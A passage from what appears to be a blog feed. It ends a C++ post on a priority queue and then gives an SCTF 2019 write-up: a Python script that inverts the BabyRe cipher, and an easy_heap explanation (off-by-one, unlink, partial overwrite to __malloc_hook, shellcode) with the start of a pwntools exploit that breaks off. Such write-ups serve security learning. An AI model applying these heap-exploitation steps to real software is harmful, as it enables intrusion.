class="line"><span class="comment">//break;</span></span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> Cur=<span class="number">0</span>;Cur&lt;N;++Cur)&#123;</span><br><span class="line"><span class="keyword">if</span>(prime[Cur]!=<span class="number">0</span>&amp;&amp;prime[Cur]&lt;=N)</span><br><span class="line"><span class="comment">//cout&lt;&lt;prime[Cur]&lt;&lt;" ";</span></span><br><span class="line">++num;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;endl;</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;num&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h2><p>给出优先队列的实现，实现4个操作</p><p>•   ADD N P：往队列里加入id为N的优先级为P的任务<br> •   NEXT:输出下一个最高优先级的任务的id，如果优先级相同输出id小的任务，若队列中没有任务输出-1<br> •   REMOVE N：移除id为N的任务<br> •   COUNT：输出队列中的任务数量</p><p>使用briority_queue就行了，需要在结构体里重载&lt;符号，这样才能给节点排序。使用set记录删除节点，完成remove功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> id,p;</span><br><span class="line"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (Node a, Node b)&#123;</span><br><span class="line"><span class="keyword">if</span>(a.p==b.p)</span><br><span class="line"><span class="keyword">return</span> a.id&gt;b.id;</span><br><span class="line"><span class="keyword">return</span> a.p&lt;b.p;</span><br><span class="line">&#125;</span><br><span class="line">Node()&#123;&#125;</span><br><span class="line">Node(<span class="keyword">int</span> a,<span class="keyword">int</span> b)&#123;</span><br><span class="line">id=a;</span><br><span class="line">p=b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; logg;</span><br><span class="line">priority_queue&lt;Node&gt; que;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> id,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">que.push(Node(id,p));</span><br><span class="line">++sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dele</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">logg.push_back(id);</span><br><span class="line">--sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">next</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(sum==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">Node tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">tmp=que.top();</span><br><span class="line"><span class="keyword">if</span>(find(logg.begin(),logg.end(),tmp.id)!=logg.end())</span><br><span class="line">&#123;</span><br><span class="line">que.pop();</span><br><span class="line">logg.erase(find(logg.begin(),logg.end(),tmp.id));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;tmp.id&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">count</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> choice,idt,pt;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;choice;</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;idt&gt;&gt;pt;</span><br><span class="line">add(idt,pt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">next();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;idt;</span><br><span class="line">dele(idt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">count();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">5</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;字符串编辑距离&quot;&gt;&lt;a href=&quot;#字符串编辑距离&quot; class=&quot;headerlink&quot; title=&quot;字符串编辑距离&quot;&gt;&lt;/a&gt;字符串编辑距离&lt;/h2&gt;&lt;p&gt;动态规划&lt;/p&gt;
&lt;p&gt;把两个字符串变成相同的三个基本操作定义如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;修改</summary>
      
    
    
    
    <category term="oi" scheme="http://pidanxu.github.io/categories/oi/"/>
    
    
    <category term="oi" scheme="http://pidanxu.github.io/tags/oi/"/>
    
  </entry>
  
  <entry>
    <title>sctf2019</title>
    <link href="http://pidanxu.github.io/2019/06/30/sctf2019/"/>
    <id>http://pidanxu.github.io/2019/06/30/sctf2019/</id>
    <published>2019-06-30T13:27:39.000Z</published>
    <updated>2019-06-30T14:36:44.224Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="BabyRe"><a href="#BabyRe" class="headerlink" title="BabyRe"></a>BabyRe</h2><p>三层，第一层是迷宫，第二层是base64解码，最后一层第1组与2，3，4组的运算结果异或得到密文比较。那么，密文最后一组和前面三组运算结果异或就能推出最开始四组也就是flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function  <span class="comment"># PEP 3105</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#res&gt;&gt;2^res&lt;&lt;8^res&lt;&lt;0xc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># max bits &gt; 0 == width of the value in bits (e.g., int_16 -&gt; 16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate left: 0b1001 --&gt; 0b0011</span></span><br><span class="line">rol = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits % max_bits) &amp; (<span class="number">2</span> ** max_bits - <span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span> ** max_bits - <span class="number">1</span>)) &gt;&gt; (max_bits - (r_bits % max_bits)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate right: 0b1001 --&gt; 0b1100</span></span><br><span class="line">ror = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    ((val &amp; (<span class="number">2</span> ** max_bits - <span class="number">1</span>)) &gt;&gt; r_bits % max_bits) | \</span><br><span class="line">    (val &lt;&lt; (max_bits - (r_bits % max_bits)) &amp; (<span class="number">2</span> ** max_bits - <span class="number">1</span>))</span><br><span class="line">a1=[<span class="number">0xD6</span>,<span class="number">0x90</span>,<span class="number">0x0E9</span>,<span class="number">0x0FE</span>,<span class="number">0x0CC</span>,<span class="number">0x0E1</span>,<span class="number">0x3D</span>,<span class="number">0x0B7</span>,<span class="number">0x16</span>,<span class="number">0x0B6</span>,<span class="number">0x14</span>,<span class="number">0x0C2</span>,<span class="number">0x28</span>,<span class="number">0x0FB</span>,<span class="number">0x2C</span>,<span class="number">0x5</span>,<span class="number">0x2B</span>,<span class="number">0x67</span>,<span class="number">0x9A</span>,<span class="number">0x76</span>,<span class="number">0x2A</span>,<span class="number">0x0BE</span>,<span class="number">0x4</span>,<span class="number">0x0C3</span>,<span class="number">0x0AA</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x6</span>,<span class="number">0x99</span>,<span class="number">0x9C</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0x0F4</span>,<span class="number">0x91</span>,<span class="number">0x0EF</span>,<span class="number">0x98</span>,<span class="number">0x7A</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0B</span>,<span class="number">0x43</span>,<span class="number">0x0ED</span>,<span class="number">0x0CF</span>,<span class="number">0x0AC</span>,<span class="number">0x62</span>,<span class="number">0x0E4</span>,<span class="number">0x0B3</span>,<span class="number">0x1C</span>,<span class="number">0x0A9</span>,<span class="number">0x0C9</span>,<span class="number">0x8</span>,<span class="number">0x0E8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0x0DF</span>,<span class="number">0x94</span>,<span class="number">0x0FA</span>,<span class="number">0x75</span>,<span class="number">0x8F</span>,<span class="number">0x3F</span>,<span class="number">0x0A6</span>,<span class="number">0x47</span>,<span class="number">0x7</span>,<span class="number">0x0A7</span>,<span class="number">0x0FC</span>,<span class="number">0x0F3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0x0BA</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3C</span>,<span class="number">0x19</span>,<span class="number">0x0E6</span>,<span class="number">0x85</span>,<span class="number">0x4F</span>,<span class="number">0x0A8</span>,<span class="number">0x68</span>,<span class="number">0x6B</span>,<span class="number">0x81</span>,<span class="number">0x0B2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0x0DA</span>,<span class="number">0x8B</span>,<span class="number">0x0F8</span>,<span class="number">0x0EB</span>,<span class="number">0x0F</span>,<span class="number">0x4B</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9D</span>,<span class="number">0x35</span>,<span class="number">0x1E</span>,<span class="number">0x24</span>,<span class="number">0x0E</span>,<span class="number">0x5E</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0x0D1</span>,<span class="number">0x0A2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7C</span>,<span class="number">0x3B</span>,<span class="number">0x1</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,<span class="number">0x0D4</span>,<span class="number">0</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9F</span>,<span class="number">0x0D3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4C</span>,<span class="number">0x36</span>,<span class="number">0x2</span>,<span class="number">0x0E7</span>,<span class="number">0x0A0</span>,<span class="number">0x0C4</span>,<span class="number">0x0C8</span>,<span class="number">0x9E</span>,<span class="number">0x0EA</span>,<span class="number">0x0BF</span>,<span class="number">0x8A</span>,<span class="number">0x0D2</span>,<span class="number">0x40</span>,<span class="number">0x0C7</span>,<span class="number">0x38</span>,<span class="number">0x0B5</span>,<span class="number">0x0A3</span>,<span class="number">0x0F7</span>,<span class="number">0x0F2</span>,<span class="number">0x0CE</span>,<span class="number">0x0F9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0x0A1</span>,<span class="number">0x0E0</span>,<span class="number">0x0AE</span>,<span class="number">0x5D</span>,<span class="number">0x0A4</span>,<span class="number">0x9B</span>,<span class="number">0x34</span>,<span class="number">0x1A</span>,<span class="number">0x55</span>,<span class="number">0x0AD</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x0F5</span>,<span class="number">0x8C</span>,<span class="number">0x0B1</span>,<span class="number">0x0E3</span>,<span class="number">0x1D</span>,<span class="number">0x0F6</span>,<span class="number">0x0E2</span>,<span class="number">0x2E</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0x0CA</span>,<span class="number">0x60</span>,<span class="number">0x0C0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0x0AB</span>,<span class="number">0x0D</span>,<span class="number">0x53</span>,<span class="number">0x4E</span>,<span class="number">0x6F</span>,<span class="number">0x0D5</span>,<span class="number">0x0DB</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0x0DE</span>,<span class="number">0x0FD</span>,<span class="number">0x8E</span>,<span class="number">0x2F</span>,<span class="number">0x3</span>,<span class="number">0x0FF</span>,<span class="number">0x6A</span>,<span class="number">0x72</span>,<span class="number">0x6D</span>,<span class="number">0x6C</span>,<span class="number">0x5B</span>,<span class="number">0x51</span>,<span class="number">0x8D</span>,<span class="number">0x1B</span>,<span class="number">0x0AF</span>,<span class="number">0x92</span>,<span class="number">0x0BB</span>,<span class="number">0x0DD</span>,<span class="number">0x0BC</span>,<span class="number">0x7F</span>,<span class="number">0x11</span>,<span class="number">0x0D9</span>,<span class="number">0x5C</span>,<span class="number">0x41</span>,<span class="number">0x1F</span>,<span class="number">0x10</span>,<span class="number">0x5A</span>,<span class="number">0x0D8</span>,<span class="number">0x0A</span>,<span class="number">0x0C1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0x0A5</span>,<span class="number">0x0CD</span>,<span class="number">0x7B</span>,<span class="number">0x0BD</span>,<span class="number">0x2D</span>,<span class="number">0x74</span>,<span class="number">0x0D0</span>,<span class="number">0x12</span>,<span class="number">0x0B8</span>,<span class="number">0x0E5</span>,<span class="number">0x0B4</span>,<span class="number">0x0B0</span>,<span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4A</span>,<span class="number">0x0C</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7E</span>,<span class="number">0x65</span>,<span class="number">0x0B9</span>,<span class="number">0x0F1</span>,<span class="number">0x9</span>,<span class="number">0x0C5</span>,<span class="number">0x6E</span>,<span class="number">0x0C6</span>,<span class="number">0x84</span>,<span class="number">0x18</span>,<span class="number">0x0F0</span>,<span class="number">0x7D</span>,<span class="number">0x0EC</span>,<span class="number">0x3A</span>,<span class="number">0x0DC</span>,<span class="number">0x4D</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0x0EE</span>,<span class="number">0x5F</span>,<span class="number">0x3E</span>,<span class="number">0x0D7</span>,<span class="number">0x0CB</span>,<span class="number">0x39</span>,<span class="number">0x48</span>,<span class="number">0x0C6</span>,<span class="number">0x0BA</span>,<span class="number">0x0B1</span>,<span class="number">0x0A3</span>,<span class="number">0x50</span>,<span class="number">0x33</span>,<span class="number">0x0AA</span>,<span class="number">0x56</span>,<span class="number">0x97</span>,<span class="number">0x91</span>,<span class="number">0x7D</span>,<span class="number">0x67</span>,<span class="number">0x0DC</span>,<span class="number">0x22</span>,<span class="number">0x70</span>,<span class="number">0x0B2</span>,<span class="number">0x0</span>,<span class="number">0x7F</span>,<span class="number">0x7F</span>,<span class="number">0x0A3</span>,<span class="number">0x0F6</span>,<span class="number">0x0BD</span>,<span class="number">0x7C</span>,<span class="number">0x65</span>,<span class="number">0x90</span>,<span class="number">0x1C</span>,<span class="number">0x80</span>,<span class="number">0x0E3</span>,<span class="number">0x0E3</span>,<span class="number">0x9</span>,<span class="number">0x0FE</span>,<span class="number">0x7F5F</span>,<span class="number">0x94</span>,<span class="number">0x1B</span>,<span class="number">0x0C0</span>,<span class="number">0x0B0</span>,<span class="number">0x5535</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x0E5</span>,<span class="number">0x0E3</span>,<span class="number">0x9</span>,<span class="number">0x0FE</span>,<span class="number">0x7F0D9</span>,<span class="number">0x92</span>,<span class="number">0x1B</span>,<span class="number">0x0C0</span>,<span class="number">0x0B0</span>,<span class="number">0x557F</span>,<span class="number">0x7F</span>,<span class="number">0x40</span>,<span class="number">0x0E5</span>,<span class="number">0x0E3</span>,<span class="number">0x9</span>,<span class="number">0x0FE</span>,<span class="number">0x7F7F</span>,<span class="number">0x7F</span>,<span class="number">0x4</span>,<span class="number">0x64</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x68</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x38</span>,<span class="number">0x37</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x0BE</span>,<span class="number">0x4</span>,<span class="number">0x6</span>,<span class="number">0x80</span>,<span class="number">0x0C5</span>,<span class="number">0x0AF</span>,<span class="number">0x76</span>,<span class="number">0x47</span>,<span class="number">0x9F</span>,<span class="number">0x0CC</span>,<span class="number">0x40</span>,<span class="number">0x1F</span>,<span class="number">0x0D8</span>,<span class="number">0x0BF</span>,<span class="number">0x92</span>,<span class="number">0x0EF</span>,<span class="number">0x80</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor2</span><span class="params">(key)</span>:</span></span><br><span class="line">    new_val=a1[key&gt;&gt;<span class="number">24</span>] &lt;&lt; <span class="number">0x18</span> | a1[<span class="number">0xff</span>&amp;(key&gt;&gt;<span class="number">16</span>)] &lt;&lt; <span class="number">0x10</span> | a1[<span class="number">0xff</span>&amp;(key&gt;&gt;<span class="number">8</span>)] &lt;&lt; <span class="number">0x8</span> | a1[<span class="number">0xff</span>&amp;key]</span><br><span class="line">   <span class="comment"># print (hex(new_val))</span></span><br><span class="line">    <span class="keyword">return</span> rol(new_val, <span class="number">8</span>, <span class="number">32</span>)^ror(new_val,<span class="number">2</span>,<span class="number">32</span>)^rol(new_val, <span class="number">0xc</span>, <span class="number">32</span>)^ror(new_val,<span class="number">6</span>,<span class="number">32</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor1</span><span class="params">(a,b,c,d)</span>:</span></span><br><span class="line">    tp=xor2(b^c^d)</span><br><span class="line">    <span class="comment">#print (hex(tp))</span></span><br><span class="line">    <span class="keyword">return</span> hex(tp^a)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decry1</span><span class="params">(a,b,c,d)</span>:</span></span><br><span class="line">    f1=a^xor2(b^c^d)</span><br><span class="line">    <span class="keyword">return</span> f1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">value=<span class="number">0x635e0e24</span></span><br><span class="line">newval = rol(value, <span class="number">8</span>, <span class="number">32</span>)^ror(value,<span class="number">2</span>,<span class="number">32</span>)^rol(value, <span class="number">0xc</span>, <span class="number">32</span>)^ror(value,<span class="number">6</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"0x%08x &gt;&gt; 0x%02x --&gt; 0x%08x"</span> % (value, <span class="number">8</span>, newval))</span><br><span class="line"><span class="comment">#print (hex(a[0x64]&lt;&lt;0x18|a[0x63]&lt;&lt;0x10|a[0x62]&lt;&lt;0x8|a[0x61]))</span></span><br><span class="line">flag=<span class="string">'dcbahgfe43218765'</span></span><br><span class="line">msg=[flag[<span class="number">0</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>),flag[<span class="number">4</span>:<span class="number">8</span>].encode(<span class="string">'hex'</span>),flag[<span class="number">8</span>:<span class="number">12</span>].encode(<span class="string">'hex'</span>),flag[<span class="number">12</span>:<span class="number">16</span>].encode(<span class="string">'hex'</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    msg.append(xor1(int(msg[i],<span class="number">16</span>),int(msg[i+<span class="number">1</span>],<span class="number">16</span>),int(msg[i+<span class="number">2</span>],<span class="number">16</span>),int(msg[i+<span class="number">3</span>],<span class="number">16</span>)))</span><br><span class="line"><span class="comment">#print (msg)</span></span><br><span class="line"><span class="comment">#msg[26]==0xbe040680</span></span><br><span class="line"><span class="comment">#msg[27]==0xc5af7647</span></span><br><span class="line"><span class="comment">#msg[28]==0x9fcc401f</span></span><br><span class="line"><span class="comment">#msg[29]==0xd8bf92ef</span></span><br><span class="line">flag=[<span class="number">0xd8bf92ef</span>,<span class="number">0x9fcc401f</span>,<span class="number">0xc5af7647</span>,<span class="number">0xbe040680</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    flag.append(decry1(flag[i],flag[i+<span class="number">1</span>],flag[i+<span class="number">2</span>],flag[i+<span class="number">3</span>]))</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>没有泄露libc的地方，所以要靠shellcode。官方的预期解似乎是最后要最终进⾏⼀个经典的⽂件结构体伪造 ，抽时间要看看。(由于给的libc是2.23版本，该版本是没有对IO_File结构体的vtable进⾏检查的，所以这个可以通过篡改 unsorted bin的bk指针⾄ IO_list_all-0x10处，导致_IO_list_all被篡改，最终进⾏⼀个经典的⽂件结构体伪 造，vtable即指向我们可控的程序段，⾥⾯则写上mmap段地址，当出现堆错误打印信息时，即可触发 )</p><p>然而其实__malloc_hook离main_arena很近，所以把main_arena+88的低地址改为\x10就可以对 malloc_hook进行写入了。(注意，amd64和i386的shellcode不一样，默认的是i386的。64位的需要自己设置)</p><p>就是off by one过后unlink，然后bss段任意写，把某bss段free到unsorted bin过后就能获得main_arena+88然后低地址覆盖\x10。就变成了malloc_hook，然后对malloc_hook进行写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">"./easy_heap"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"~/Desktop/libc.so.6"</span>&#125;)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'__malloc_hook'</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Address '</span>)</span><br><span class="line">addr=p.recvn(<span class="number">14</span>)</span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span 